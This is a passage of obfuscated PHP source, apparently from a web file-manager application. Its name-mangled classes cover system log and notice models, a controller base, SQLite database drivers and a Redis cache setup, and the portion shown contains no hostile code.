isset($ö¡·€ˆ[$Ü­ÉÆúÊ[32]]) ? $ö¡·€ˆ[$Ü­ÉÆúÊ[32]] : LNG($Ü­ÉÆúÊ[2650]); $Ó©Øı„¾[$Ü­ÉÆúÊ[2477]] = isset($ö¡·€ˆ[$Ü­ÉÆúÊ[2477]]) ? $ö¡·€ˆ[$Ü­ÉÆúÊ[2477]] : $Ü­ÉÆúÊ[12]; $Ó©Øı„¾[$Ü­ÉÆúÊ[1865]] = isset($’øÒ´‹[$ŞÙÊğÏ]) ? $’øÒ´‹[$ŞÙÊğÏ] : $¥Ç­®õˆ; $Ó©Øı„¾[$Ü­ÉÆúÊ[2358]] = $ö¡·€ˆ; $£×è×Öš = json_decode($Ó©Øı„¾[$Ü­ÉÆúÊ[540]], !0); $Ó©Øı„¾[$Ü­ÉÆúÊ[1608]] = isset($£×è×Öš[$Ü­ÉÆúÊ[1608]]) ? $£×è×Öš[$Ü­ÉÆúÊ[1608]] : $Ü­ÉÆúÊ[12]; $Ó©Øı„¾[$Ü­ÉÆúÊ[2651]] = IpLocation::get($Ó©Øı„¾[$Ü­ÉÆúÊ[1608]]); if (strpos($ŞÙÊğÏ, $Ü­ÉÆúÊ[2421]) === 0 || isset($£×è×Öš[$Ü­ÉÆúÊ[2419]])) { $£×è×Öš[$Ü­ÉÆúÊ[90]] = $í«¯û‘‹[$£×è×Öš[$Ü­ÉÆúÊ[191]]]; $£×è×Öš[$Ü­ÉÆúÊ[2435]] = $í«¯û‘‹[$£×è×Öš[$Ü­ÉÆúÊ[2419]]]; if ($£×è×Öš[$Ü­ÉÆúÊ[33]] == $Ü­ÉÆúÊ[643]) { $£×è×Öš[$Ü­ÉÆúÊ[540]][$Ü­ÉÆúÊ[1346]] = $í«¯û‘‹[$£×è×Öš[$Ü­ÉÆúÊ[540]][$Ü­ÉÆúÊ[1346]]]; $£×è×Öš[$Ü­ÉÆúÊ[540]][$Ü­ÉÆúÊ[1347]] = $í«¯û‘‹[$£×è×Öš[$Ü­ÉÆúÊ[540]][$Ü­ÉÆúÊ[1347]]]; } if ($£×è×Öš[$Ü­ÉÆúÊ[33]] == $Ü­ÉÆúÊ[2429]) { $£×è×Öš[$Ü­ÉÆúÊ[540]][$Ü­ÉÆúÊ[191]] = $í«¯û‘‹[$£×è×Öš[$Ü­ÉÆúÊ[540]][$Ü­ÉÆúÊ[191]]]; } if ($£×è×Öš[$Ü­ÉÆúÊ[33]] == $Ü­ÉÆúÊ[1334]) { $£×è×Öš[$Ü­ÉÆúÊ[2435]] = $£×è×Öš[$Ü­ÉÆúÊ[90]]; $£×è×Öš[$Ü­ÉÆúÊ[2419]] = $£×è×Öš[$Ü­ÉÆúÊ[2435]][$Ü­ÉÆúÊ[191]]; $£×è×Öš[$Ü­ÉÆúÊ[90]] = !1; $£×è×Öš[$Ü­ÉÆúÊ[191]] = $Ü­ÉÆúÊ[12]; } $µº«Ò¯ = array($Ü­ÉÆúÊ[1334], $Ü­ÉÆúÊ[2417]); if (!in_array($£×è×Öš[$Ü­ÉÆúÊ[33]], $µº«Ò¯)) { if ($£×è×Öš[$Ü­ÉÆúÊ[90]] && $£×è×Öš[$Ü­ÉÆúÊ[90]][$Ü­ÉÆúÊ[188]] == $Ü­ÉÆúÊ[189]) { $ªáïÍõö[] = $Ó©Øı„¾[$Ü­ÉÆúÊ[487]]; unset($ÇÁõ«“È[$ñ¨Ã‡˜¼]); continue; } if ($£×è×Öš[$Ü­ÉÆúÊ[2435]] && $£×è×Öš[$Ü­ÉÆúÊ[2435]][$Ü­ÉÆúÊ[188]] == $Ü­ÉÆúÊ[189]) { $ªáïÍõö[] = $Ó©Øı„¾[$Ü­ÉÆúÊ[487]]; unset($ÇÁõ«“È[$ñ¨Ã‡˜¼]); continue; } } } $Ó©Øı„¾[$Ü­ÉÆúÊ[540]] = $£×è×Öš; unset($Ó©Øı„¾[$Ü­ÉÆúÊ[2655]]); $÷Ç¢ª£ã[] = $Ó©Øı„¾; } $this->clearSystemPathLog($ªáïÍõö); return $÷Ç¢ª£ã; } private function clearSystemPathLog($ÎŒ—¨‚Â) { $Ï«à¼É‰ =& $_SERVER[©—Ò»ÅĞ]; if (count($ÎŒ—¨‚Â) == 0) { return; } $äÜ®²¥” = array($Ï«à¼É‰[487] => array($Ï«à¼É‰[7], array_unique($ÎŒ—¨‚Â))); $this->where($äÜ®²¥”)->delete(); } public function deviceList($ŠŞ‘Ÿ…š, $Ü¦ƒ´ÖË = 0) { $–ªİıÄ =& $_SERVER[©—Ò»ÅĞ]; $’³›³ôõ = array($–ªİıÄ[1592] => $ŠŞ‘Ÿ…š, $–ªİıÄ[231] => array($–ªİıÄ[1182], $Ü¦ƒ´ÖË), $–ªİıÄ[33] => $–ªİıÄ[2129]); $ä¾ê’»² = array(); $ŒÊûîÈø = $this->field($–ªİıÄ[2656])->where($’³›³ôõ)->order($–ªİıÄ[2433])->limit(50)->select(); foreach ($ŒÊûîÈø as $õĞ¾ı¤¾ => $šøªáì°) { if ($õĞ¾ı¤¾ > 0 && abs($šøªáì°[$–ªİıÄ[231]] - $ŒÊûîÈø[$õĞ¾ı¤¾ - 1][$–ªİıÄ[231]]) < 5) { continue; } $‚õ’ú¾¬ = json_decode($šøªáì°[$–ªİıÄ[540]], !0); $šøªáì°[$–ªİıÄ[1608]] = isset($‚õ’ú¾¬[$–ªİıÄ[1608]]) ? $‚õ’ú¾¬[$–ªİıÄ[1608]] : $–ªİıÄ[12]; unset($‚õ’ú¾¬[$–ªİıÄ[1608]]); $áê€“…Ä = $this->deviceType($‚õ’ú¾¬[$–ªİıÄ[2422]]); if (isset($ä¾ê’»²[$áê€“…Ä])) { continue; } $šøªáì°[$–ªİıÄ[2651]] = IpLocation::get($šøªáì°[$–ªİıÄ[1608]]); $šøªáì°[$–ªİıÄ[540]] = $‚õ’ú¾¬; $ä¾ê’»²[$áê€“…Ä] = $šøªáì°; } return array_values($ä¾ê’»²); } public function deviceType($îÄÆ³Œ ) { return $îÄÆ³Œ ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\156\157\164\151\143\x65\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\x63\x6f\156\164\x65\x6e\x74", "\x61\165\164\x68", "\155\x6f\x64\145", "\x74\151\x6d\x65", "\164\171\160\145", "\x6c\145\x76\x65\x6c", "\145\156\x61\x62\154\145", "\163\157\x72\x74"); public function listData($È¯Šßè· = false, $ ¼øÙ»ä = "\x73\157\x72\x74", $ª˜¦¿ğä = false) { return parent::listData($È¯Šßè·, $ ¼øÙ»ä, $ª˜¦¿ğä); } public function add($¬Åã¬Éé) { $ß•±Ëù =& $_SERVER[©—Ò»ÅĞ]; $ŠĞ£¢Œ¾ = time(); if ($¬Åã¬Éé[$ß•±Ëù[16]] == $ß•±Ëù[2657]) { $ŠĞ£¢Œ¾ = strtotime($¬Åã¬Éé[$ß•±Ëù[204]]); } $¬Åã¬Éé[$ß•±Ëù[204]] = $ŠĞ£¢Œ¾; return parent::insert($¬Åã¬Éé); } public function update($Ğ‚‡¢Å°, $÷ª¥¦µù) { $Ò«×±Şƒ =& $_SERVER[©—Ò»ÅĞ]; $‹Ğù¢¢¨ = $this->listData($Ğ‚‡¢Å°); if (!$‹Ğù¢¢¨) { return !1; } $öÇı¤Œ« = time(); if ($÷ª¥¦µù[$Ò«×±Şƒ[16]] == $Ò«×±Şƒ[2657]) { $öÇı¤Œ« = strtotime($÷ª¥¦µù[$Ò«×±Şƒ[204]]); } $÷ª¥¦µù[$Ò«×±Şƒ[204]] = $öÇı¤Œ«; return parent::update($Ğ‚‡¢Å°, $÷ª¥¦µù); } public function remove($Éù•¬ÏË) { $Ğıí°ªç = $this->listData($Éù•¬ÏË); if (!$Ğıí°ªç || $Ğıí°ªç[$_SERVER[©—Ò»ÅĞ][189]]) { return !1; } return parent::remove($Éù•¬ÏË); } public function sort($·±Ëı°º, $’Âàƒ£) { return parent::update($·±Ëı°º, $’Âàƒ£); } public function enable($öÍ“À¡Ï, $åÀ‡‰ÓØ) { return parent::update($öÍ“À¡Ï, array($_SERVER[©—Ò»ÅĞ][2658] => $åÀ‡‰ÓØ)); } private function initUserOption() { $ßƒÀÌİÜ =& $_SERVER[©—Ò»ÅĞ]; $this->optionType = $ßƒÀÌİÜ[2659]; $this->modelType = $ßƒÀÌİÜ[2660]; $this->field = array($ßƒÀÌİÜ[2661], $ßƒÀÌİÜ[32], $ßƒÀÌİÜ[204], $ßƒÀÌİÜ[33], $ßƒÀÌİÜ[2662], $ßƒÀÌİÜ[850], $ßƒÀÌİÜ[226]); } public function userNoticeGet($·÷”½¡« = false) { $this->initUserOption(); return parent::listData($·÷”½¡«, $_SERVER[©—Ò»ÅĞ][487], !0); } public function userNoticeAdd($›°æÎ¸) { $€­ŒüŸó =& $_SERVER[©—Ò»ÅĞ]; $this->initUserOption(); $„ÉàŞ¥ = $this->findByKey($€­ŒüŸó[2661], $›°æÎ¸[$€­ŒüŸó[487]]); if ($„ÉàŞ¥) { return !0; } $ë½çàõ¡ = array($€­ŒüŸó[2661] => $›°æÎ¸[$€­ŒüŸó[487]], $€­ŒüŸó[32] => $›°æÎ¸[$€­ŒüŸó[32]], $€­ŒüŸó[204] => $›°æÎ¸[$€­ŒüŸó[204]], $€­ŒüŸó[33] => isset($›°æÎ¸[$€­ŒüŸó[33]]) ? $›°æÎ¸[$€­ŒüŸó[33]] : 1, $€­ŒüŸó[2662] => isset($›°æÎ¸[$€­ŒüŸó[2662]]) ? $›°æÎ¸[$€­ŒüŸó[2662]] : 0, $€­ŒüŸó[850] => 0, $€­ŒüŸó[226] => 0); return parent::insert($ë½çàõ¡); } public function userNoticeEdit($ÛÒÄä¡º, $‰Å©¦ìæ) { $this->initUserOption(); return parent::update($ÛÒÄä¡º, $‰Å©¦ìæ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\145\x6d\137\x6f\160\164\151\x6f\x6e"; protected $jsonField = array("\155\x65\156\x75", "\162\157\154\x65", "\162\x6f\154\x65\107\x72\157\x75\160", "\162\x65\147\151\x73\164", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ÙÇ÷ªâŒ) { return "\123\x79\x73\164\x65\155\117\160\164\x69\x6f\x6e\137{$ÙÇ÷ªâŒ}"; } protected function optionDefault($«İºßæ = '') { $«î˜¥“õ =& $_SERVER[©—Ò»ÅĞ]; if ($«İºßæ == $«î˜¥“õ[12]) { return $GLOBALS[$«î˜¥“õ[6]][$«î˜¥“õ[468]]; } } } goto cÒ½ñ‘Î; dÉˆ§ âêâ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÁÁä â– =& $_SERVER[©—Ò»ÅĞ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÁÁä â–[6]] =& $config; $this->values[$ÁÁä â–[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÁÁä â–[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($º·âÉé„) { if (1 === func_num_args()) { $this->{$º·âÉé„} = new $º·âÉé„(); } else { $´â”Äú = new ReflectionClass($º·âÉé„); $Óùö¹‘é = func_get_args(); array_shift($Óùö¹‘é); $this->{$º·âÉé„} = $´â”Äú->newInstanceArgs($Óùö¹‘é); } return $this->{$º·âÉé„}; } public function routeBind($‹œ¹…ıß, $Èè¹‡, $ÏÎÔŞú = 3) { $ç÷ÂœÃœ =& $_SERVER[©—Ò»ÅĞ]; $Ğó‹ò§î = $this->in[$ç÷ÂœÃœ[9]]; $‹œ¹…ıß = str_replace($ç÷ÂœÃœ[10], $ç÷ÂœÃœ[11], trim(trim($‹œ¹…ıß, $ç÷ÂœÃœ[8]), $ç÷ÂœÃœ[12])); if (!$‹œ¹…ıß || count($Ğó‹ò§î) <= $ÏÎÔŞú) { return !1; } $Šßôí×â = !0; $‰ªæÚı˜ = explode($ç÷ÂœÃœ[8], $‹œ¹…ıß); for ($¾÷ª© ø = 0; $¾÷ª© ø < count($‰ªæÚı˜); $¾÷ª© ø++) { if ($‰ªæÚı˜[$¾÷ª© ø] != $Ğó‹ò§î[$ÏÎÔŞú + $¾÷ª© ø]) { $Šßôí×â = !1; break; } } if (!$Šßôí×â) { return; } call_user_func_array(array($this, $Èè¹‡), array()); } public function routeArgs($ÙüİÇáà = 3) { $‹Ã®ßª = $this->in[$_SERVER[©—Ò»ÅĞ][9]]; if (count($‹Ã®ßª) <= $ÙüİÇáà) { return array(); } $òˆ×½²› = array(); for ($Ò»ßñ÷ = $ÙüİÇáà; $Ò»ßñ÷ < count($‹Ã®ßª); $Ò»ßñ÷ += 2) { $òˆ×½²›[$‹Ã®ßª[$Ò»ßñ÷]] = $‹Ã®ßª[$Ò»ßñ÷ + 1]; $this->in[$‹Ã®ßª[$Ò»ßñ÷]] = $‹Ã®ßª[$Ò»ßñ÷ + 1]; } return $òˆ×½²›; } protected function assign($–‡Æ¼, $ç™é×Ô ) { $this->values[$–‡Æ¼] = $ç™é×Ô ; } protected function display($©ÎÈ‡æ) { ob_end_clean(); extract($this->values); require $this->tpl . $©ÎÈ‡æ; } } class DbSqliteBase extends Db { public function __construct($ª±Ô‘¸¦ = '') { $´ÀÁöâ =& $_SERVER[©—Ò»ÅĞ]; if (!extension_loaded($´ÀÁöâ[13])) { think_exception(think_lang($´ÀÁöâ[14]) . $´ÀÁöâ[15]); } if (!empty($ª±Ô‘¸¦)) { if (!isset($ª±Ô‘¸¦[$´ÀÁöâ[16]])) { $ª±Ô‘¸¦[$´ÀÁöâ[16]] = 438; } $this->config = $ª±Ô‘¸¦; if (empty($this->config[$´ÀÁöâ[17]])) { $this->config[$´ÀÁöâ[17]] = array(); } } } public function connect($ËŠÛşö„ = '', $üäŒ™¸ì = 0) { $Íı†ãŒø =& $_SERVER[©—Ò»ÅĞ]; if (!isset($this->linkID[$üäŒ™¸ì])) { if (empty($ËŠÛşö„)) { $ËŠÛşö„ = $this->config; } $°Ğ­¤¤ = !empty($ËŠÛşö„[$Íı†ãŒø[17]][$Íı†ãŒø[18]]) ? $ËŠÛşö„[$Íı†ãŒø[17]][$Íı†ãŒø[18]] : $this->pconnect; $½š—Ëèä = $°Ğ­¤¤ ? $Íı†ãŒø[19] : $Íı†ãŒø[20]; $this->linkID[$üäŒ™¸ì] = $½š—Ëèä($ËŠÛşö„[$Íı†ãŒø[21]], $ËŠÛşö„[$Íı†ãŒø[16]]); if (!$this->linkID[$üäŒ™¸ì]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$üäŒ™¸ì], 30000); if (1 != think_config($Íı†ãŒø[22])) { unset($this->config); } } return $this->linkID[$üäŒ™¸ì]; } public function free() { $this->queryID = null; } public function query($ü¶ã†¤) { $šİ€Š¹‘ =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ü¶ã†¤; if ($this->queryID) { $this->free(); } think_action_status($šİ€Š¹‘[23], 1); think_status($šİ€Š¹‘[24]); $this->queryID = sqlite_query($this->_linkID, $ü¶ã†¤); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÈûÚ÷Â´ = $this->getAll(); return $ÈûÚ÷Â´; } } public function execute($×ÆÈ¤ÊÀ) { $¸ğ…ôøÁ =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $×ÆÈ¤ÊÀ; if ($this->queryID) { $this->free(); } think_action_status($¸ğ…ôøÁ[25], 1); think_status($¸ğ…ôøÁ[24]); $ØŒÊïç¨ = sqlite_exec($this->_linkID, $×ÆÈ¤ÊÀ); $this->debug(); if (!1 === $ØŒÊïç¨) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[©—Ò»ÅĞ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Æ¼ò¦İÑ = sqlite_query($this->_linkID, $_SERVER[©—Ò»ÅĞ][27]); if (!$Æ¼ò¦İÑ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $‘­¡Ö…á = sqlite_query($this->_linkID, $_SERVER[©—Ò»ÅĞ][28]); if (!$‘­¡Ö…á) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $üÚÄÒ¿â = array(); if ($this->numRows > 0) { for ($üÉôšçÄ = 0; $üÉôšçÄ < $this->numRows; $üÉôšçÄ++) { $üÚÄÒ¿â[$üÉôšçÄ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $üÚÄÒ¿â; } public function getFields($óì™ˆ§ê) { $ÎÃœÁøİ =& $_SERVER[©—Ò»ÅĞ]; $¡âˆı¿Ä = $this->query($ÎÃœÁøİ[29] . $óì™ˆ§ê . $ÎÃœÁøİ[30]); $è§çïİì = array(); if ($¡âˆı¿Ä) { foreach ($¡âˆı¿Ä as $ñ±ùÆÊ => $±Îíèôö) { $è§çïİì[$±Îíèôö[$ÎÃœÁøİ[31]]] = array($ÎÃœÁøİ[32] => $±Îíèôö[$ÎÃœÁøİ[31]], $ÎÃœÁøİ[33] => $±Îíèôö[$ÎÃœÁøİ[34]], $ÎÃœÁøİ[35] => (bool) ($±Îíèôö[$ÎÃœÁøİ[36]] === $ÎÃœÁøİ[12]), $ÎÃœÁøİ[37] => $±Îíèôö[$ÎÃœÁøİ[38]], $ÎÃœÁøİ[39] => strtolower($±Îíèôö[$ÎÃœÁøİ[40]]) == $ÎÃœÁøİ[41], $ÎÃœÁøİ[42] => strtolower($±Îíèôö[$ÎÃœÁøİ[43]]) == $ÎÃœÁøİ[44]); } } return $è§çïİì; } public function getTables($Ç‹ú¨á = '') { $ø€ƒ Ì =& $_SERVER[©—Ò»ÅĞ]; $½ˆë‰Ô£ = $this->query($ø€ƒ Ì[45] . $ø€ƒ Ì[46] . $ø€ƒ Ì[47]); $«¢§™¥‘ = array(); foreach ($½ˆë‰Ô£ as $Ú­Üò­² => $’ôüÊ±) { $«¢§™¥‘[$Ú­Üò­²] = current($’ôüÊ±); } return $«¢§™¥‘; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $±–ÆÇŸ„ =& $_SERVER[©—Ò»ÅĞ]; $³Úşµ±Œ = sqlite_last_error($this->_linkID); $this->error = $³Úşµ±Œ . $±–ÆÇŸ„[4] . sqlite_error_string($³Úşµ±Œ); if ($±–ÆÇŸ„[12] != $this->queryStr) { $this->error .= LNG($±–ÆÇŸ„[48]) . $this->queryStr; } think_trace($this->error, $±–ÆÇŸ„[12], $±–ÆÇŸ„[49]); return $this->error; } public function escapeString($ªò­Á‡½) { return sqlite_escape_string($ªò­Á‡½); } public function parseLimit($š˜è‹û) { $»¾†¯Ù£ =& $_SERVER[©—Ò»ÅĞ]; $ó›¶éøå = $»¾†¯Ù£[12]; if (!empty($š˜è‹û)) { $š˜è‹û = explode($»¾†¯Ù£[50], $š˜è‹û); if (count($š˜è‹û) > 1) { $ó›¶éøå .= $»¾†¯Ù£[51] . $š˜è‹û[1] . $»¾†¯Ù£[52] . $š˜è‹û[0] . $»¾†¯Ù£[53]; } else { $ó›¶éøå .= $»¾†¯Ù£[51] . $š˜è‹û[0] . $»¾†¯Ù£[53]; } } return $ó›¶éøå; } } class DbSqlite3Base extends Db { public function __construct($Â»¯·›Ş = '') { $¯Üßëœ =& $_SERVER[©—Ò»ÅĞ]; if (!class_exists($¯Üßëœ[54])) { think_exception(think_lang($¯Üßëœ[14]) . $¯Üßëœ[55]); } if (!empty($Â»¯·›Ş)) { if (!isset($Â»¯·›Ş[$¯Üßëœ[16]])) { $Â»¯·›Ş[$¯Üßëœ[16]] = 438; } $this->config = $Â»¯·›Ş; if (empty($this->config[$¯Üßëœ[17]])) { $this->config[$¯Üßëœ[17]] = array(); } } } public function connect($²²ÒÎá– = '', $ã†àäª÷ = 0) { $Î‰¼ñ‰Æ =& $_SERVER[©—Ò»ÅĞ]; if (!isset($this->linkID[$ã†àäª÷])) { if (empty($²²ÒÎá–)) { $²²ÒÎá– = $this->config; } $this->linkID[$ã†àäª÷] = new SQLite3($²²ÒÎá–[$Î‰¼ñ‰Æ[21]]); if (!$this->linkID[$ã†àäª÷]) { think_exception($this->linkID[$ã†àäª÷]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ã†àäª÷]->busyTimeout(30000); if (1 != think_config($Î‰¼ñ‰Æ[22])) { unset($this->config); } } return $this->linkID[$ã†àäª÷]; } public function free() { $this->queryID = null; } public function query($Îæö÷°²) { $£½¸í« =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Îæö÷°²; if ($this->queryID) { $this->free(); } think_action_status($£½¸í«[23], 1); think_status($£½¸í«[24]); $this->queryID = $this->_linkID->query($Îæö÷°²); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $‡½·ò€Ô = $this->getAll(); $this->numRows = count($‡½·ò€Ô); return $‡½·ò€Ô; } } public function execute($ª¦æ€ã¤) { $áÁéÎÚ¡ =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ª¦æ€ã¤; if ($this->queryID) { $this->free(); } think_action_status($áÁéÎÚ¡[25], 1); think_status($áÁéÎÚ¡[24]); $¥û±ğÙ£ = $this->_linkID->exec($ª¦æ€ã¤); $this->debug(); if (!1 === $¥û±ğÙ£) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[©—Ò»ÅĞ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $È ó÷Í¬ = $this->_linkID->query($_SERVER[©—Ò»ÅĞ][27]); if (!$È ó÷Í¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ó‡ÂİîØ = $this->_linkID->query($_SERVER[©—Ò»ÅĞ][28]); if (!$Ó‡ÂİîØ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÈµšÀ = array(); while ($ÏÂÉÁŒØ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÈµšÀ[] = $ÏÂÉÁŒØ; } $this->queryID->reset(); return $ÈµšÀ; } public function getFields($´ªã°œË) { $¾İç¡¡Ù =& $_SERVER[©—Ò»ÅĞ]; $²æÙå…ä = $this->query($¾İç¡¡Ù[29] . $´ªã°œË . $¾İç¡¡Ù[30]); $ËÖåá¤¡ = array(); if ($²æÙå…ä) { foreach ($²æÙå…ä as $‰Èû‚© => $Œ«„©‰à) { $ËÖåá¤¡[$Œ«„©‰à[$¾İç¡¡Ù[32]]] = array($¾İç¡¡Ù[32] => $Œ«„©‰à[$¾İç¡¡Ù[32]], $¾İç¡¡Ù[33] => $Œ«„©‰à[$¾İç¡¡Ù[33]], $¾İç¡¡Ù[35] => (bool) ($Œ«„©‰à[$¾İç¡¡Ù[35]] === $¾İç¡¡Ù[12]), $¾İç¡¡Ù[37] => $Œ«„©‰à[$¾İç¡¡Ù[56]], $¾İç¡¡Ù[39] => (bool) $Œ«„©‰à[$¾İç¡¡Ù[57]], $¾İç¡¡Ù[42] => (bool) $Œ«„©‰à[$¾İç¡¡Ù[57]]); } } return $ËÖåá¤¡; } public function getTables($Ş¬âîø = '') { $Ñ€¶•£ =& $_SERVER[©—Ò»ÅĞ]; $¡•…Ï¬ª = $this->query($Ñ€¶•£[45] . $Ñ€¶•£[46] . $Ñ€¶•£[47]); $²º‹à¿º = array(); foreach ($¡•…Ï¬ª as $­”Ç›é => $‚è¦şÜ´) { $²º‹à¿º[$­”Ç›é] = current($‚è¦şÜ´); } return $²º‹à¿º; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ª½ÅÄÛ¡ =& $_SERVER[©—Ò»ÅĞ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ª½ÅÄÛ¡[12] != $this->queryStr) { $this->error .= LNG($ª½ÅÄÛ¡[48]) . $this->queryStr; } think_trace($this->error, $ª½ÅÄÛ¡[12], $ª½ÅÄÛ¡[49]); return $this->error; } public function escapeString($é¯ÒØ¿¦) { $óÁ³¶¿Ñ =& $_SERVER[©—Ò»ÅĞ]; if ($this->_linkID) { return $this->_linkID->escapeString($é¯ÒØ¿¦); } return str_ireplace($óÁ³¶¿Ñ[58], $óÁ³¶¿Ñ[59], $é¯ÒØ¿¦); } public function parseLimit($Ù®Ä‘ë‡) { $çéìÉÓì =& $_SERVER[©—Ò»ÅĞ]; $©•ÕÀ¨û = $çéìÉÓì[12]; if (!empty($Ù®Ä‘ë‡)) { $Ù®Ä‘ë‡ = explode($çéìÉÓì[50], $Ù®Ä‘ë‡); if (count($Ù®Ä‘ë‡) > 1) { $©•ÕÀ¨û .= $çéìÉÓì[51] . $Ù®Ä‘ë‡[1] . $çéìÉÓì[52] . $Ù®Ä‘ë‡[0] . $çéìÉÓì[53]; } else { $©•ÕÀ¨û .= $çéìÉÓì[51] . $Ù®Ä‘ë‡[0] . $çéìÉÓì[53]; } } return $©•ÕÀ¨û; } } goto a„ö„ÉíÒ£; e±¥šÀ³ê‚: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($®êÕèİø, $ÏúÒùêë) { $ÒÈÈ¥Ô =& $_SERVER[©—Ò»ÅĞ]; if (!class_exists($ÒÈÈ¥Ô[1027])) { show_json($ÒÈÈ¥Ô[1028], !1); } $this->cacheTime = $ÏúÒùêë; $ÆÌë»†„ = isset($®êÕèİø[$ÒÈÈ¥Ô[1029]]) ? $®êÕèİø[$ÒÈÈ¥Ô[1029]] : 10; $çòŸá¦® = _get($®êÕèİø, $ÒÈÈ¥Ô[1026]); if ($çòŸá¦® && is_array($çòŸá¦®)) { $this->initCluster($®êÕèİø, $ÆÌë»†„); } else { $this->handle = $this->init($®êÕèİø, $ÆÌë»†„); } } private function init($°ª¡ì®„, $Éô­ôÊç) { $·Û»ÛÍ† =& $_SERVER[©—Ò»ÅĞ]; $ˆï—° œ = new Redis(); $Ó´¶Ğ½§ = isset($°ª¡ì®„[$·Û»ÛÍ†[1030]]) ? $°ª¡ì®„[$·Û»ÛÍ†[1030]] : !1; if ($Ó´¶Ğ½§) { $ˆï—° œ->pconnect($°ª¡ì®„[$·Û»ÛÍ†[206]], $°ª¡ì®„[$·Û»ÛÍ†[207]], $Éô­ôÊç); } else { $ˆï—° œ->connect($°ª¡ì®„[$·Û»ÛÍ†[206]], $°ª¡ì®„[$·Û»ÛÍ†[207]], $Éô­ôÊç); } if (!empty($°ª¡ì®„[$·Û»ÛÍ†[502]])) { $ˆï—° œ->auth($°ª¡ì®„[$·Û»ÛÍ†[502]]); } if (!empty($°ª¡ì®„[$·Û»ÛÍ†[858]]) && $°ª¡ì®„[$·Û»ÛÍ†[858]] != 0) { $ˆï—° œ->select($°ª¡ì®„[$·Û»ÛÍ†[858]]); } return $ˆï—° œ; } private function initCluster($÷ú¥™¾, $Å•äÓÔ´) { $Õ§•… =& $_SERVER[©—Ò»ÅĞ]; $ÇØÙ’ „ = array($Õ§•…[1031], $Õ§•…[1032], $Õ§•…[1033]); $ıã¬¦‹ã = $Õ§•…[1031]; if (isset($÷ú¥™¾[$Õ§•…[16]]) && in_array($÷ú¥™¾[$Õ§•…[16]], $ÇØÙ’ „)) { $ıã¬¦‹ã = $÷ú¥™¾[$Õ§•…[16]]; } switch ($ıã¬¦‹ã) { case $Õ§•…[1031]: $this->_slave($÷ú¥™¾, $Å•äÓÔ´); break; case $Õ§•…[1032]: break; case $Õ§•…[1033]: $this->isCluster = !0; $Å®áüí = $÷ú¥™¾[$Õ§•…[1026]]; $à¡ì¶„Í = isset($÷ú¥™¾[$Õ§•…[1030]]) ? $÷ú¥™¾[$Õ§•…[1030]] : !1; $¾ù‰º§ğ = isset($÷ú¥™¾[$Õ§•…[502]]) ? $÷ú¥™¾[$Õ§•…[502]] : null; $this->handle = new RedisCluster(NUll, $Å®áüí, $Å•äÓÔ´, $Å•äÓÔ´, $à¡ì¶„Í, $¾ù‰º§ğ); break; default: break; } } private function _slave($çõõ„‹ù, $ã®³ùµ) { $ƒœÎÃ = $çõõ„‹ù[$_SERVER[©—Ò»ÅĞ][1026]]; $this->filterConfig($çõõ„‹ù, $ƒœÎÃ[0]); $this->handle = $this->init($çõõ„‹ù, $ã®³ùµ); unset($ƒœÎÃ[0]); if (empty($ƒœÎÃ)) { return; } $¡áİÁĞÛ = array_rand($ƒœÎÃ); $this->filterConfig($çõõ„‹ù, $ƒœÎÃ[$¡áİÁĞÛ]); $this->slaveHandle = $this->init($çõõ„‹ù, $ã®³ùµ); } private function filterConfig(&$Œåïßô, $Ê„îË–¬) { $èÔ®­Ä =& $_SERVER[©—Ò»ÅĞ]; $ÑŒŠÃµú = explode($èÔ®­Ä[4], $Ê„îË–¬); $àãªÙ¯° = array($èÔ®­Ä[206] => $ÑŒŠÃµú[0], $èÔ®­Ä[207] => $ÑŒŠÃµú[1]); $Œåïßô = array_merge($Œåïßô, $àãªÙ¯°); } public function 